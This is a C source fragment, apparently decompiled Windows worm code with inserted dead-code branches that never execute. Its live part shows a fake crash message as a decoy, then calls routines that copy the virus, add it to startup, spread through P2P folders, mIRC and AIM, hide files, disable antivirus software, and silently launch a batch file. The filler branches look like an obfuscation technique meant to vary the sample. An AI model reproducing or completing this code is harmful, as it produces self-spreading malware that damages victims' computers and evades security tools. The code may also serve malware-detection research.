#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void _MyRegisterClass(HINSTANCE param_1)
{
    WNDCLASSEXA local_3c;

    // --- INSERTED DEAD BRANCH 1 (Math Invariant, Category A: System info) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char userName[256];
        DWORD size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            volatile int dummyUse = userName[0];
        }
        char compName[256];
        size = sizeof(compName);
        if (GetComputerNameA(compName, &size)) {
            volatile int dummyUse = compName[0];
        }
        volatile DWORD dummySum = 0;
        for (int i = 0; i < 10; i++) {
            dummySum += si.dwNumberOfProcessors + st.wHour;
        }
        // read existing local parameter
        volatile int readLocal = (int)(DWORD_PTR)param_1;
        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&st, sizeof(st));
    }

    local_3c.cbSize = sizeof(WNDCLASSEXA);
    local_3c.style = CS_HREDRAW | CS_VREDRAW;
    local_3c.lpfnWndProc = _WndProc_16;
    local_3c.cbClsExtra = 0;
    local_3c.cbWndExtra = 0;
    local_3c.hInstance = param_1;
    local_3c.hIcon = LoadIconA(param_1, (LPCSTR)0x7f00);
    local_3c.hCursor = LoadCursorA((HINSTANCE)0x0, (LPCSTR)0x7f00);
    local_3c.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    local_3c.lpszMenuName = NULL;
    local_3c.lpszClassName = _szWindowClass;
    local_3c.hIconSm = LoadIconA(local_3c.hInstance, (LPCSTR)0x7f00);

    // --- INSERTED DEAD BRANCH 2 (Combination, Category B: Memory & string) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char* dummyBuf = (char*)malloc(64);
        if (dummyBuf) {
            sprintf_s(dummyBuf, 64, "Dummy %d", (int)dummy_tick_2);
            size_t len = strlen(dummyBuf);
            char* dummyBuf2 = (char*)malloc(len + 10);
            if (dummyBuf2) {
                memcpy(dummyBuf2, dummyBuf, len);
                memset(dummyBuf2 + len, 0, 10);
                volatile int hash = 0;
                for (int i = 0; i < (int)len; i++) {
                    hash = (hash * 31) + dummyBuf2[i];
                }
                // read existing local
                volatile int readLocal2 = local_3c.style;
                free(dummyBuf2);
            }
            free(dummyBuf);
        }
        volatile char localBuf[32];
        memset((void*)localBuf, 0, sizeof(localBuf));
    }

    MessageBoxA(_hWnd,
                "This program has encountered an error and needs to close, please try again. If the problem persists try restarting your computer.",
                "Error", MB_ICONERROR);
    _GetVirus();
    _CopyVirus();
    _WinStartup();
    _P2PCopy();
    _FindmIRC();
    _WriteBatch();
    _FindAIM();
    _HideFiles();
    _DestroyAVs();

    // --- INSERTED DEAD BRANCH 3 (System Query, Category C: Bitwise/Math loops) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile unsigned char dummyArr[32];
        for (int i = 0; i < 32; i++) {
            dummyArr[i] = (unsigned char)(i * 7);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int i = 0; i < 32; i++) {
            hash ^= dummyArr[i];
            hash *= 0x01000193;
        }
        volatile int xorSum = 0;
        for (int i = 0; i < 32; i++) {
            xorSum ^= dummyArr[i];
        }
        // read existing local
        volatile int readLocal3 = local_3c.cbSize;
        SecureZeroMemory((void*)dummyArr, sizeof(dummyArr));
        SYSTEM_INFO si2;
        GetSystemInfo(&si2);
        volatile DWORD dummyProc = si2.dwNumberOfProcessors;
    }

    ShellExecuteA(_hWnd, "open", "BBbLWDB.Bat", NULL, NULL, SW_HIDE);
    RegisterClassExA(&local_3c);
}
